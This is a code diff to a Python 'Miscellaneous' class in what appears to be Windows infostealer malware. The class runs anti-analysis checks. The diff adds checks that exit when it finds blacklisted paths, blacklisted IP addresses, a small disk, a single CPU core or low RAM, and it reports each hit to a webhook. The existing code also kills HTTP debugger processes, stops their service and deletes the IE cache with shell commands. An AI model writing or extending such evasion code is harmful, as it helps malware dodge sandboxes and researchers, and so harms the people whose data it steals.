@@ -1,12 +1,15 @@
 import time
 import sys
 import ctypes
+import psutil
 import os
 
 import win32api
 
 from ..utils.http import hasInternet
 from ..utils.webhook import Webhook
+
+from ..constants import UserInfo, Lists
 
 class Miscellanoeus:
 	def __init__(self, webhook_url: str):
@@ -25,24 +28,8 @@ class Miscellanoeus:
 				pass
 			
 	def CheckRam(self):
-		class MEMORYSTATUSEX(ctypes.Structure):
-			_fields_ = [
-				("dwLength", ctypes.c_ulong),
-				("dwMemoryLoad", ctypes.c_ulong),
-				("ullTotalPhys", ctypes.c_ulonglong),
-				("ullAvailPhys", ctypes.c_ulonglong),
-				("ullTotalPageFile", ctypes.c_ulonglong),
-				("ullAvailPageFile", ctypes.c_ulonglong),
-				("ullTotalVirtual", ctypes.c_ulonglong),
-				("ullAvailVirtual", ctypes.c_ulonglong),
-				("sullAvailExtendedVirtual", ctypes.c_ulonglong),
-			]
-
-		memoryStatus = MEMORYSTATUSEX()
-		memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
-		ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
-
-		if memoryStatus.ullTotalPhys / 1073741824 < 1:
+		memory = psutil.virtual_memory().total
+		if memory <= 4294967296:
 			self.webhook.send(f"Ram Check: Less than 4 GB of RAM exists on this system", "Miscellaneous")
 			os._exit(1)
 
@@ -72,9 +59,40 @@ class Miscellanoeus:
 		os.system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1")
 		os.system("sc stop HTTPDebuggerPro >nul 2>&1")
 		os.system("cmd.exe /c @RD /S /Q \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\" >nul 2>&1")
-			
+	
+	def CheckPaths(self):
+		for path in Lists.BLACKLISTED_PATHS:
+			if os.path.exists(path):
+				self.webhook.send("Blacklisted Path Found", "Miscellaneous")
+				os._exit(1)
+			else:
+				pass
+	
+	def CheckIPs(self):
+		if UserInfo.IP in Lists.BLACKLISTED_IPS:
+			self.webhook.send(f"`{UserInfo.IP}` Is A Blacklisted IP Address", "Miscellaneous")
+			os._exit(1)
+		else:
+			pass
+	
+	# Thanks Tekky
+	def CheckSpecs(self):
+		try:
+			DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
+   
+			if int(DISK) <= 50:
+				self.webhook.send(f"`{DISK}` Disk Size Is Blacklisted", "Miscellaneous")
+				os._exit(1)
+			if int(psutil.cpu_count()) <= 1:
+				self.webhook.send(f"CPU Core Count Is Less Than Or Equal To `1`", "Miscellaneous")
+				os._exit(1)
+		except:
+			pass
 
 	def StartChecks(self):
+		self.CheckPaths()
+		self.CheckIPs()
+		self.CheckSpecs()
 		self.CheckRam()
 		self.CheckIsDebuggerPresent()
 		self.CheckDiskSize()
